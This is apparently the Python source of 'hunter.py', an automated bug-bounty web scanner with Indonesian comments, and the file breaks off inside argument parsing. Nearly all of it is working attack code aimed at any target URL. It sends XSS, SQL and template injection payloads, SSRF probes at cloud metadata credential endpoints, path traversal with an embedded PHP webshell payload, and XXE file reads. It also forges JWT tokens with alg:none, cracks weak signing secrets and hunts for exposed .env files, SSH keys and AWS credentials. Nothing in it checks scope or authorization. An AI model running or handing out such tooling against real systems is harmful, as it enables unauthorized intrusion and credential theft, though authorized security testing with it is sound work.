#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
hunter.py — Bug Bounty Hunter Engine (stdlib-only)
Usage:
  python hunter.py <url> [--modules a,b,c] [--cookie "k=v"] [--jwt TOKEN]
                   [--bearer TOKEN] [--proxy http://127.0.0.1:8080]
                   [--timeout 10] [--threads 10] [--slow]
No-arg = help. Hasil tersimpan ke hunter_results.json di sebelah script ini.

Modules:
  headers,exposed,cors,methods,admin,dirfuzz,https,info,
  xss,sqli,nosqli,ssti,ssrf,traversal,redirect,crlf,xxe,ldap,
  jwt,idor,graphql,massassign,proto,hpp,hostheader,clickjack,
  rate,2fa,oauth,deser,subtakeover,http2,websocket,cachepoison,timing
Default: semua module aman (tanpa side effect).
"""
import sys, os, json, re, ssl, base64, time, hmac, hashlib, string
import urllib.request, urllib.parse, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "hunter_results.json")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 bb-hunter/1.0"

SEVERITY_RANK = {"CRIT": 5, "HIGH": 4, "MED": 3, "LOW": 2, "INFO": 1}


def make_opener(proxy=None, timeout=10):
    handlers = []
    if proxy:
        handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    handlers.append(urllib.request.HTTPSHandler(context=ctx))
    return urllib.request.build_opener(*handlers), timeout


class T:
    def __init__(self, base, cookie=None, jwt=None, bearer=None, proxy=None, timeout=10, slow=False):
        self.base = base.rstrip("/")
        self.cookie = cookie or ""
        self.jwt = jwt
        self.bearer = bearer
        self.opener, self.timeout = make_opener(proxy, timeout)
        self.slow = slow
        self.findings = []
        self.checked = 0
        self._last_plain_req = None

    # ---------- request primitives ----------
    def req(self, path, method="GET", data=None, headers=None, timeout=None, raw=False):
        url = self.base + path
        h = {"User-Agent": UA, "Accept": "*/*"}
        if self.cookie:
            h["Cookie"] = self.cookie
        if self.jwt:
            h["Authorization"] = "Bearer " + self.jwt
        if self.bearer:
            h["Authorization"] = "Bearer " + self.bearer
        if headers:
            h.update(headers)
        if isinstance(data, dict):
            data = urllib.parse.urlencode(data).encode()
        elif isinstance(data, str):
            data = data.encode()
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        try:
            resp = self.opener.open(r, timeout=timeout or self.timeout)
            body = resp.read(300000)
            return resp.status, dict(resp.headers), body
        except urllib.error.HTTPError as e:
            try:
                return e.code, dict(e.headers), e.read(300000)
            except Exception:
                return e.code, {}, b""
        except Exception as e:
            return None, {}, str(e).encode()

    def req_raw(self, raw_bytes, timeout=None):
        """Kirim raw HTTP request (buat CRLF/request smuggling)."""
        from http.client import HTTPConnection, HTTPSConnection
        u = urllib.parse.urlparse(self.base)
        conn_cls = HTTPSConnection if u.scheme == "https" else HTTPConnection
        conn = conn_cls(u.hostname, u.port or (443 if u.scheme == "https" else 80), timeout=timeout or self.timeout)
        try:
            conn.request("POST", "/", body=raw_bytes, headers={"Content-Length": str(len(raw_bytes))})
            resp = conn.getresponse()
            body = resp.read(300000)
            return resp.status, dict(resp.getheaders()), body
        except Exception as e:
            return None, {}, str(e).encode()
        finally:
            try:
                conn.close()
            except Exception:
                pass

    def add(self, module, sev, title, detail, poc=None):
        self.findings.append({
            "module": module, "severity": sev, "title": title,
            "detail": detail, "poc": poc or "",
        })
        tag = {"CRIT": "[!!]", "HIGH": "[!!]", "MED": "[+]", "LOW": "[-]", "INFO": "[i]"}[sev]
        print(f"  {tag} [{module}] {title}")

    def run(self, modules):
        for m in modules:
            fn = getattr(self, "mod_" + m, None)
            if not fn:
                print(f"  [x] unknown module: {m}")
                continue
            print(f"\n=== {m} ===")
            try:
                fn()
            except Exception as e:
                print(f"  [x] module {m} crash: {e}")

    # ================= MODULES =================
    def mod_headers(self):
        st, hd, body = self.req("/")
        if st is None:
            print("  [x] no response"); return
        checks = {
            "Strict-Transport-Security": "HSTS hilang",
            "Content-Security-Policy": "CSP hilang (XSS lebih mudah)",
            "X-Frame-Options": "X-Frame-Options hilang (clickjacking)",
            "X-Content-Type-Options": "X-Content-Type-Options hilang (MIME sniffing)",
            "Referrer-Policy": "Referrer-Policy hilang (token leak via referrer)",
            "Permissions-Policy": "Permissions-Policy hilang",
        }
        for k, v in checks.items():
            if k not in hd:
                self.add("headers", "LOW", v, "")
            else:
                self.checked += 1
        server = hd.get("Server") or hd.get("X-Powered-By")
        if server:
            self.add("headers", "LOW", f"Software version exposed: {server}", "info disclosure")

    def mod_exposed(self):
        paths = [
            "/.git/config", "/.git/HEAD", "/.git/refs/heads/master", "/.env", "/.env.local",
            "/.env.production", "/.env.backup", "/.env.dev", "/.env.staging", "/.env.example",
            "/backup.zip", "/backup.tar.gz", "/backup.sql", "/db.sqlite3", "/database.sql",
            "/dump.sql", "/dump.db", "/data.sql", "/users.sql", "/.bash_history", "/.DS_Store",
            "/web.config", "/.htaccess", "/config.php", "/config.js", "/config.json",
            "/config.yaml", "/package.json", "/composer.json", "/Gemfile", "/requirements.txt",
            "/.aws/credentials", "/.aws/config", "/server.js", "/app.js", "/id_rsa",
            "/.ssh/id_rsa", "/.ssh/id_ed25519", "/.gitlab-ci.yml", "/.github/workflows",
            "/docker-compose.yml", "/Dockerfile", "/.docker/config.json", "/.npmrc",
            "/.pypirc", "/.travis.yml", "/Jenkinsfile", "/phpinfo.php", "/info.php",
            "/test.php", "/.well-known/security.txt",
        ]
        for p in paths:
            st, hd, body = self.req(p)
            if st and st == 200:
                head = body[:300]
                if head.strip():
                    self.add("exposed", "CRIT", f"{p} accessible (200)", head[:160].decode(errors="replace"), f"curl {self.base}{p}")

    def mod_cors(self):
        for origin in ["https://evil.com", "null", f"https://{self.base.split('//')[1].split('/')[0]}.evil.com", "https://evil" + self.base.split("//")[1].split("/")[0]]:
            st, hd, body = self.req("/", headers={"Origin": origin})
            if st is None:
                return
            acao = hd.get("Access-Control-Allow-Origin", "")
            acac = hd.get("Access-Control-Allow-Credentials", "")
            if acao == "*":
                self.add("cors", "HIGH", "CORS wildcard *", "semua origin boleh baca response", f"Origin: {origin}")
                return
            if acao == origin or origin in acao:
                sev = "HIGH" if acac.lower() == "true" else "MED"
                self.add("cors", sev, f"CORS reflect arbitrary origin: {origin}", f"credentials={acac}", f"curl -H 'Origin: {origin}' {self.base}/")
                return
            if acao == "null" and origin == "null":
                self.add("cors", "HIGH", "CORS allow null origin", "sandboxed iframe bisa baca response", "")

    def mod_methods(self):
        for m in ["OPTIONS", "TRACE", "PUT", "DELETE", "PATCH", "CONNECT"]:
            st, hd, body = self.req("/", method=m)
            if st in (405, 501, None):
                continue
            if st in (200, 204):
                if m == "TRACE":
                    self.add("methods", "HIGH", "TRACE enabled (XST)", "cookie bisa dipantulkan", f"curl -X TRACE {self.base}/")
                elif m == "PUT":
                    self.add("methods", "HIGH", "PUT 200 — test arbitrary file write", "tulis file di webroot?", f"curl -X PUT {self.base}/pwn.txt -d test")
                elif m == "DELETE":
                    self.add("methods", "MED", f"DELETE returns {st}", "cek resource deletion", f"curl -X DELETE {self.base}/")
                elif m == "PATCH":
                    self.add("methods", "INFO", f"PATCH returns {st}", "", "")
                elif m == "CONNECT":
                    self.add("methods", "MED", f"CONNECT returns {st}", "proxy abuse?", "")
                else:
                    self.add("methods", "INFO", f"OPTIONS {st}", str(hd.get("Allow", "")))
            if m == "OPTIONS" and hd.get("Allow"):
                self.add("methods", "INFO", f"Allow: {hd['Allow']}", "")

    def mod_admin(self):
        paths = [
            "/admin", "/admin/", "/admin/login", "/administrator", "/wp-admin", "/wp-login.php",
            "/phpmyadmin", "/actuator", "/actuator/env", "/actuator/health", "/actuator/beans",
            "/actuator/mappings", "/actuator/heapdump", "/graphql", "/graphiql",
            "/api/docs", "/swagger", "/swagger-ui.html", "/api/swagger.json", "/v2/api-docs",
            "/v3/api-docs", "/openapi.json", "/debug", "/console", "/manager/html",
            "/solr/admin/", "/elastic", "/_cat/indices", "/jenkins", "/status",
            "/server-status", "/phpinfo.php", "/_debug", "/.well-known/security.txt",
        ]
        for p in paths:
            st, hd, body = self.req(p)
            if st and st == 200:
                head = body[:200].decode(errors="replace")
                sev = "HIGH" if any(k in p for k in ["actuator", "phpmyadmin", "heapdump", "manager", "env", "solr"]) else "MED"
                self.add("admin", sev, f"panel open: {p} (200)", head[:120], f"curl {self.base}{p}")

    def mod_dirfuzz(self):
        words = [
            "api","v1","v2","v3","assets","static","uploads","files","img","images",
            "css","js","login","register","signup","logout","profile","user","users",
            "settings","dashboard","config","test","dev","staging","old","backup",
            "tmp","data","export","import","admin.php","admin.jsp","robots.txt",
            "sitemap.xml",".well-known","manifest.json","service-worker.js",
            "wp-content","wp-includes","wp-json","xmlrpc.php","api.php","ajax.php",
            "search","results","download","upload","preview","proxy","fetch","webhook",
            "callback","oauth","callback.php","redirect","r","go","out","url.php",
            "sso","cas","auth","login.php","signup.php","register.php","reset",
            "forgot","forgot-password","password","2fa","otp","verify","confirm",
            "graphql","graphiql","gql","playground","docs","swagger","openapi",
            "health","healthz","ready","live","status","version","info","metrics",
            "actuator","env","debug","trace","stackdump","phpinfo","test.php","info.php",
        ]
        found = []
        with ThreadPoolExecutor(max_workers=12) as ex:
            futs = {ex.submit(self.req, "/" + w): w for w in words}
            for f in as_completed(futs):
                w = futs[f]
                try:
                    st, hd, body = f.result()
                except Exception:
                    continue
                if st and st == 200:
                    found.append(w)
        for w in sorted(found):
            self.add("dirfuzz", "INFO", f"path exists: /{w}", "")

    def mod_https(self):
        if not self.base.startswith("http://"):
            return
        st, hd, body = self.req("/")
        if st and st in (301, 302, 303, 307, 308):
            loc = hd.get("Location", "")
            if loc.startswith("https"):
                self.checked += 1
                return
        self.add("https", "LOW", "Tidak ada forced HTTP→HTTPS redirect", "")

    def mod_info(self):
        st, hd, body = self.req("/")
        if st is None:
            return
        txt = body.decode(errors="replace")
        sigs = {
            "stack trace": "Traceback (most recent call last)",
            "java exception": r"at com\.|at org\.",
            "webpack leak": "webpack://",
            "sourcemap": "sourceMappingURL",
            "django debug": "DEBUG = True",
            "sql exception": "SQLException",
            "php notice": "Undefined index",
            "laravel debug": "Whoops, looks like something went wrong",
            "node error": "Error: Cannot find module",
            "debug endpoint": "DEBUG mode",
            "exposed path": re.escape(self.base) + r"/[A-Za-z0-9_\-/]+\.py",
            "AWS bucket name": r"[a-z0-9.-]+\.s3[.-](amazonaws\.com|amazonaws\.com\.cn)",
            "internal ip": r"\b(?:10\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b",
            "email leak": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
        }
        for name, s in sigs.items():
            if re.search(s, txt, re.I):
                self.add("info", "HIGH" if name not in ("internal ip", "email leak") else "MED",
                         f"Info disclosure: {name}", s)
                return

    # ---------- Injection ----------
    def mod_xss(self):
        payloads = [
            "<script>alert(1337)</script>",
            "<img src=x onerror=alert(1337)>",
            "<svg onload=alert(1337)>",
            "<svg/onload=alert(1337)>",
            "<details open ontoggle=alert(1337)>",
            "<input autofocus onfocus=alert(1337)>",
            "<body onload=alert(1337)>",
            "<iframe srcdoc='<script>alert(1337)</script>'>",
            "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=x onerror=alert(1337)>\">",
            "\"><script>alert(1337)</script>",
            "'-alert(1337)-'",
            "\" onmouseover=alert(1337) x=\"",
            "<a href=javas&#99;ript:alert(1337)>x</a>",
            "<img src=x onerror=al\\x65rt(1337)>",
            "%3Cscript%3Ealert(1337)%3C/script%3E",
        ]
        params = ["q", "search", "query", "id", "page", "name", "url", "redirect", "keyword", "s", "callback", "cb", "msg", "message", "text", "value", "ref", "next", "return", "returnUrl", "redirectUrl", "u", "r", "path", "file", "lang", "locale"]
        found = False
        for pl in payloads:
            enc = urllib.parse.quote(pl)
            for p in params:
                st, hd, body = self.req("/?" + p + "=" + enc)
                if st is None:
                    continue
                txt = body.decode(errors="replace")
                if pl in txt or "alert(1337)" in txt:
                    self.add("xss", "HIGH", f"Reflected XSS di param: {p}", pl, f"{self.base}/?{p}={enc}")
                    found = True
                    break
            if found:
                break

    def mod_sqli(self):
        payloads = [
            "'", "''", "' OR '1'='1", '" OR "1"="1', "' OR '1'='1'--", "' OR 1=1-- -",
            "admin'--", "admin' OR '1'='1'--", "1' AND 1=1--", "1' AND 1=2--",
            "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "' UNION SELECT @@version--",
            "1' AND SLEEP(3)--", "1'; WAITFOR DELAY '0:0:3'--", "1' AND pg_sleep(3)--",
            "1) AND 1=1--", "1' AND '1'='1", "1 AND 1=1", "1 AND 1=2", "0' XOR 1=1--",
        ]
        err_sigs = [
            "sql syntax", "mysql_fetch", "mysqli", "postgresql", "sqlite3", "ORA-",
            "unclosed quotation", "syntax error", "pg_query", "microsoft ole db",
            "SQLSTATE", "warning: mysql", "in your sql syntax", "mariadb",
            "invalid query", "query failed", "unterminated string", "psql",
            "Microsoft SQL Server", "odbc", "syntax error at or near",
            "you have an error in your sql syntax", "nativeclient",
        ]
        params = ["id", "user", "user_id", "uid", "page", "cat", "category", "product", "item", "news_id", "article", "pid", "num", "order", "sort", "search", "q", "filter", "limit", "offset"]
        # error-based
        for p in params:
            for pl in payloads:
                st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(pl))
                if st is None:
                    continue
                txt = body.decode(errors="replace").lower()
                for s in err_sigs:
                    if s in txt:
                        self.add("sqli", "HIGH", f"SQL error signature di param {p}: {s}", f"payload: {pl}", f"{self.base}/?{p}={urllib.parse.quote(pl)}")
                        return
        # time-based blind (kalau --slow)
        if self.slow:
            print("  [i] time-based check (slow mode)")
            for p in params:
                for pl, delay in [("1' AND SLEEP(5)--", 5), ("1'; WAITFOR DELAY '0:0:5'--", 5), ("1' AND pg_sleep(5)--", 5)]:
                    t0 = time.time()
                    st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(pl), timeout=15)
                    dt = time.time() - t0
                    if dt >= delay:
                        self.add("sqli", "CRIT", f"Time-based blind SQLi di param {p} ({dt:.1f}s)", pl, f"{self.base}/?{p}={urllib.parse.quote(pl)}")
                        return

    def mod_nosqli(self):
        payloads = [
            '{"$ne": null}', '{"$gt": ""}', '{"$where": "1==1"}',
            "admin' || '1'=='1", "admin'+||+'", '[$ne]=1',
        ]
        sigs = ["authentication bypass", "invalid json", "bson", "mongo"]
        st, hd, body = self.req("/", data=urllib.parse.urlencode({"username": '{"$ne": null}', "password": '{"$ne": null}'}).encode(), headers={"Content-Type": "application/x-www-form-urlencoded"})
        if st is None:
            return
        txt = body.decode(errors="replace")
        for p in ["login", "auth", "signin"]:
            for pl in payloads:
                st2, hd2, body2 = self.req("/?" + p + "=" + urllib.parse.quote(pl))
                if st2 and st2 == 200:
                    t2 = body2.decode(errors="replace").lower()
                    for s in sigs:
                        if s in t2:
                            self.add("nosqli", "MED", f"NoSQL injection candidate di {p}: {s}", pl, "")
                            return

    def mod_ssti(self):
        payloads = [
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "{{config}}",
            "${{7*7}}", "*{7*7}", "=7*7", "{{ ''.__class__.__mro__[2].__subclasses__() }}",
        ]
        params = ["q", "name", "search", "msg", "message", "template", "page", "title", "username", "email", "comment", "content", "input"]
        for p in params:
            for pl in payloads:
                st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(pl))
                if st is None:
                    continue
                txt = body.decode(errors="replace")
                if "49" in txt and "7*7" not in txt:
                    self.add("ssti", "HIGH", f"SSTI — 7*7=49 rendered di param {p}", pl, f"{self.base}/?{p}={urllib.parse.quote(pl)}")
                    return

    def mod_ssrf(self):
        probes = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.170.2/v2/credentials/",          # ECS
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://100.100.100.200/latest/meta-data/",       # Alibaba
            "http://127.0.0.1:6379/",
            "http://127.0.0.1:3306/",
            "http://127.0.0.1:22/",
            "http://127.0.0.1:9200/",
            "http://[::1]/",
            "http://0.0.0.0/",
            "http://2130706433/",
            "http://0177.0.0.1/",
            "http://127.1/",
            "http://localhost/",
            "http://localtest.me/",
            "gopher://127.0.0.1:6379/_INFO",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
        ]
        sigs = ["ami-id", "instance-id", "instance-type", "security-credentials", "accesskeyid",
                "redis_version", "error", "mysql", "ssh", "internal", "root:", "daemon:",
                "[fonts]", "for 16-bit app support", "identitydocument", "privatekey"]
        params = ["url", "target", "link", "uri", "path", "webhook", "callback", "img", "image", "avatar", "fetch", "proxy", "u", "dest", "redirect", "redirect_url", "next", "continue", "file", "document", "pdf", "feed", "rss", "xml"]
        for p in params:
            for pl in probes:
                st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(pl))
                if st is None:
                    continue
                txt = body.decode(errors="replace")
                for s in sigs:
                    if s.lower() in txt.lower():
                        self.add("ssrf", "CRIT", f"SSRF via param {p}", f"payload: {pl}", f"{self.base}/?{p}={urllib.parse.quote(pl)}")
                        return

    def mod_traversal(self):
        payloads = [
            "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd", "/etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
            "expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==",
        ]
        sigs = ["root:", "daemon:", "[fonts]", "for 16-bit app support", "PD9waHA", "uid=", "bin/bash", "www-data"]
        params = ["file", "page", "path", "include", "load", "doc", "download", "template", "view", "folder", "dir", "src", "locate", "open", "read", "filename"]
        for p in params:
            for pl in payloads:
                st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(pl))
                if st is None:
                    continue
                txt = body.decode(errors="replace")
                for s in sigs:
                    if s in txt:
                        self.add("traversal", "CRIT", f"Path traversal di param {p}", f"payload: {pl}", f"{self.base}/?{p}={urllib.parse.quote(pl)}")
                        return

    def mod_redirect(self):
        payloads = ["https://evil.com", "//evil.com", "https://evil.com/%2f..", "javascript:alert(1)", "https://evil.com#" + self.base.split("//")[1].split("/")[0]]
        params = ["url", "next", "return", "redirect", "goto", "redirect_uri", "redirect_url", "u", "r", "target", "destination", "continue", "out", "link", "retURL", "returnTo", "returnUrl"]
        for p in params:
            for pl in payloads:
                st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(pl))
                if st in (301, 302, 303, 307, 308):
                    loc = hd.get("Location", "")
                    if pl.split("#")[0] in loc or (pl.startswith("//") and loc.startswith("https://evil.com")):
                        self.add("redirect", "MED", f"Open redirect via param {p}", loc, f"{self.base}/?{p}={urllib.parse.quote(pl)}")
                        return

    def mod_crlf(self):
        tests = [
            ("/%0d%0aX-Injected:%20test", "X-Injected"),
            ("/%0d%0aSet-Cookie:%20crlf=1", "crlf=1"),
            ("/%%0a0aX-Test:crlf", "X-Test"),
            ("/?q=%0d%0aX-Inj:crlf", "X-Inj"),
        ]
        for path, sig in tests:
            st, hd, body = self.req(path)
            if st is None:
                continue
            if any(sig.lower() in k.lower() for k in hd.keys()):
                self.add("crlf", "HIGH", f"CRLF header injection: {sig}", f"path: {path}", f"curl '{self.base}{path}' -i")
                return

    def mod_xxe(self):
        if not self.base.endswith("/"):
            pass
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>',
        ]
        sigs = ["root:", "[fonts]", "ami-id", "DOCTYPE"]
        for pl in payloads:
            st, hd, body = self.req("/", method="POST", data=pl, headers={"Content-Type": "application/xml"})
            if st is None:
                continue
            txt = body.decode(errors="replace")
            for s in sigs:
                if s in txt:
                    self.add("xxe", "CRIT", "XXE file read possible", f"sig: {s}", "POST / dengan XML payload")
                    return

    def mod_ldap(self):
        payloads = ["*", "*)(uid=*))(|(uid=*", "admin*", "*)(&"]
        params = ["user", "username", "uid", "cn", "mail", "login"]
        for p in params:
            for pl in payloads:
                st, hd, body = self.req("/?" + p + "=" + urllib.parse.quote(pl))
                if st is None:
                    continue
                txt = body.decode(errors="replace").lower()
                if "ldap" in txt or "invalid dn" in txt:
                    self.add("ldap", "MED", f"LDAP injection candidate di {p}", pl, "")
                    return

    # ---------- Auth ----------
    def mod_jwt(self):
        if not self.jwt:
            print("  [i] skip — butuh --jwt TOKEN")
            return
        parts = self.jwt.split(".")
        if len(parts) != 3:
            print("  [x] bukan JWT valid")
            return
        def b64d(s):
            s += "=" * (-len(s) % 4)
            return base64.urlsafe_b64decode(s)
        try:
            header = json.loads(b64d(parts[0]))
            payload = json.loads(b64d(parts[1]))
        except Exception as e:
            print(f"  [x] decode gagal: {e}")
            return
        print(f"  [i] header: {header}")
        print(f"  [i] payload: {payload}")
        # 1. alg:none
        none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
        none_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        forged = none_header + "." + none_payload + "."
        st, hd, body = self.req("/", headers={"Authorization": "Bearer " + forged})
        if st and st in (200, 201, 202, 204):
            self.add("jwt", "CRIT", "JWT alg:none DITERIMA server", "token bisa diforge tanpa secret", "curl -H 'Authorization: Bearer " + forged + "' " + self.base + "/")
            return
        # 2. secret lemah
        weak = ["secret", "password", "secretkey", "key", "123456", "admin", "jwtsecret",
                "supersecret", "hacktheplanet", "changeme", "default", "letmein",
                "test", "testing", "dev", "development", "jwt", "token", "bearer",
                self.base.split("//")[1].split(".")[0] if "//" in self.base else ""]
        for s in weak:
            if not s:
                continue
            sig = base64.urlsafe_b64encode(hmac.new(s.encode(), (parts[0] + "." + parts[1]).encode(), hashlib.sha256).digest()).decode().rstrip("=")
            if sig == parts[2]:
                self.add("jwt", "CRIT", f"JWT secret lemah ketemu: {s!r}", "token bisa diforge siapa pun", "jwt_tool / hashcat -m 16500")
                return
        # 3. expired?
        import time as _t
        if "exp" in payload and payload["exp"] < _t.time():
            st, hd, body = self.req("/", headers={"Authorization": "Bearer " + self.jwt})
            if st and st in (200, 201):
                self.add("jwt", "MED", "JWT expired tapi masih diterima", "", "")
        # 4. RS→HS confusion hint
        if header.get("alg", "").startswith("RS"):
            print("  [i] RS256 — coba key confusion attack (butuh pubkey)")

    def mod_idor(self):
        if not (self.cookie or self.jwt or self.bearer):
            print("  [i] skip — butuh --cookie/--jwt/--bearer")
            return
        patterns = ["/api/users/", "/api/user/", "/users/", "/user/", "/api/accounts/",
                    "/api/orders/", "/api/invoices/", "/api/profile/", "/api/v1/users/",
                    "/api/messages/", "/api/tickets/", "/api/posts/", "/api/files/",
                    "/api/documents/", "/api/payments/", "/api/wallets/"]
        for pat in patterns:
            st, hd, body = self.req(pat + "1")
            if st and st in (200, 201):
                txt = body.decode(errors="replace")
                st2, hd2, body2 = self.req(pat + "0")
                if st2 and st2 in (200, 201) and body2 and body2 != b"null" and body2 != b"[]":
                    self.add("idor", "HIGH", f"IDOR candidate: {pat}0 returns data", body2[:120].decode(errors="replace"), f"curl {self.base}{pat}0")
                    return

    def mod_graphql(self):
        paths = ["/graphql", "/api/graphql", "/graphiql", "/v1/graphql", "/query"]
        introspect = '{"query":"{__schema{queryType{name}mutationType{name}types{name fields{name}}}}"}'
        for p in paths:
            st, hd, body = self.req(p, method="POST", data=introspect, headers={"Content-Type": "application/json"})
            if st is None or st == 404:
                continue
            txt = body.decode(errors="replace")
            if "__schema" in txt and "queryType" in txt:
                self.add("graphql", "MED", f"GraphQL introspection enabled: {p}", "schema penuh bisa di-dump", f"curl -X POST {self.base}{p} -d '{introspect}'")
                return
            if "query" in txt and "errors" in txt:
                self.add("graphql", "LOW", f"GraphQL endpoint: {p}", "", "")

    def mod_massassign(self):
        if not (self.cookie or self.jwt or self.bearer):
            print("  [i] skip — butuh auth")
            return
        data = json.dumps({"username": "test", "role": "admin", "is_admin": True, "admin": True})
        for p in ["/api/users", "/api/v1/users", "/api/register", "/api/signup"]:
            st, hd, body = self.req(p, method="POST", data=data, headers={"Content-Type": "application/json"})
            if st in (200, 201):
                self.add("massassign", "MED", f"Mass assignment candidate: {p} menerima role/admin field", data, "")
                return

    def mod_proto(self):
        payloads = [
            "?__proto__[admin]=true",
            "?__proto__.admin=true",
            "?constructor[prototype][admin]=true",
        ]
        st, hd, body = self.req("/" + payloads[0])
        if st is None:
            return
        txt = body.decode(errors="replace")
        if "admin" in txt.lower() and ("true" in txt or "1" in txt):
            self.add("proto", "MED", "Prototype pollution candidate", payloads[0], "")

    def mod_hpp(self):
        st1, hd1, b1 = self.req("/?id=1")
        st2, hd2, b2 = self.req("/?id=1&id=2")
        if st1 is None or st2 is None:
            return
        if b1 != b2:
            self.add("hpp", "INFO", "HPP: duplikat param menghasilkan response berbeda", "framework mana yang menang?", "")

    def mod_hostheader(self):
        host = self.base.split("//")[1].split("/")[0]
        tests = {
            "evil.com": "Host: evil.com",
            host + ":evilport": f"Host: {host}:evilport",
            "localhost": "Host: localhost",
        }
        for val, hdr in tests.items():
            st, hd, body = self.req("/", headers={"Host": val})
            if st is None:
                continue
            loc = hd.get("Location", "")
            if val in loc or val in body.decode(errors="replace")[:5000]:
                self.add("hostheader", "HIGH", f"Host header injection: {val} reflected", loc or "body reflection", f"curl -H 'Host: {val}' {self.base}/")
                return

    def mod_clickjack(self):
        st, hd, body = self.req("/")
        if st is None:
            return
        xfo = hd.get("X-Frame-Options")
        csp = hd.get("Content-Security-Policy", "")
        if not xfo and "frame-ancestors" not in csp:
            self.add("clickjack", "LOW", "Tidak ada X-Frame-Options/frame-ancestors — bisa di-frame", "", f"<iframe src='{self.base}/'></iframe>")

    def mod_rate(self):
        if self.slow:
            print("  [i] rate limit check (slow mode) — 5 request login")
            st, hd, body = self.req("/api/login", method="POST", data='{"u":"a","p":"b"}')
            if st is None:
                return
            blocked = False
            for i in range(4):
                st2, hd2, b2 = self.req("/api/login", method="POST", data='{"u":"a","p":"b"}')
                if st2 == 429:
                    blocked = True
                    break
            if not blocked:
                self.add("rate", "MED", "Tidak ada rate limit di /api/login", "brute force password mungkin", "")
        else:
            print("  [i] skip — pakai --slow buat rate limit check")

    def mod_2fa(self):
        print("  [i] manual: cek apakah 2FA bisa di-skip (response manipulation, reuse code, brute force)")

    def mod_oauth(self):
        params = ["redirect_uri", "redirect", "callback", "return_url", "returnTo"]
        st, hd, body = self.req("/oauth/authorize?redirect_uri=https://evil.com")
        if st in (301, 302) and "evil.com" in hd.get("Location", ""):
            self.add("oauth", "CRIT", "OAuth redirect_uri tidak divalidasi", hd.get("Location", ""), "")

    def mod_deser(self):
        print("  [i] manual: cek java serialized object di cookie (rO0AB), ysoserial")

    def mod_subtakeover(self):
        print("  [i] cek CNAME subdomain ke service mati (AWS S3, GitHub Pages, Heroku, Fastly, dll)")

    def mod_http2(self):
        st, hd, body = self.req("/")
        if st is None:
            return
        # basic check: server ngomong HTTP/2?
        print(f"  [i] HTTP version response: {hd.get('Server', 'unknown')}")

    def mod_websocket(self):
        print("  [i] manual: cek ws:// endpoint, origin validation, auth saat handshake")

    def mod_cachepoison(self):
        headers = [
            {"X-Forwarded-Host": "evil.com"},
            {"X-Forwarded-Scheme": "http"},
            {"X-Forwarded-Proto": "http"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-HTTP-Method-Override": "DELETE"},
        ]
        st, hd, body = self.req("/")
        if st is None:
            return
        for h in headers:
            st2, hd2, b2 = self.req("/", headers=h)
            if st2 is None:
                continue
            if b2 != body:
                self.add("cachepoison", "MED", f"Response berubah dengan header {h}", "cache poisoning candidate?", "")
                return

    def mod_timing(self):
        if not self.slow:
            print("  [i] skip — --slow buat timing attack (username enum dll)")
            return
        t0 = time.time()
        self.req("/login", method="POST", data='{"user":"nobody","pass":"x"}')
        d1 = time.time() - t0
        t0 = time.time()
        self.req("/login", method="POST", data='{"user":"nobody","pass":"a" * 1000}')
        d2 = time.time() - t0
        print(f"  [i] timing: short={d1:.2f}s long={d2:.2f}s")


ALL_MODULES = [
    "headers", "exposed", "cors", "methods", "admin", "dirfuzz", "https", "info",
    "xss", "sqli", "nosqli", "ssti", "ssrf", "traversal", "redirect", "crlf",
    "xxe", "ldap", "jwt", "idor", "graphql", "massassign", "proto", "hpp",
    "hostheader", "clickjack", "rate", "2fa", "oauth", "deser", "subtakeover",
    "http2", "websocket", "cachepoison", "timing",
]


def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__)
        sys.exit(0)
    url = args[0]
    opts = {}
    i = 1
    while i < len(args):
        if args[i] == "--modules":
            opts["modules"] = args[i + 1].split(","); i += 2
        elif args[i] == "--cookie":
            opts["cookie"] = args[i + 1]; i += 2
        elif args[i] == "--jwt":
            opts["jwt"] = args[i + 1]; i += 2
        elif args[i] == "--bearer":
            opts["bearer"] = args[i + 1]; i += 2
        elif args[i] == "--proxy":
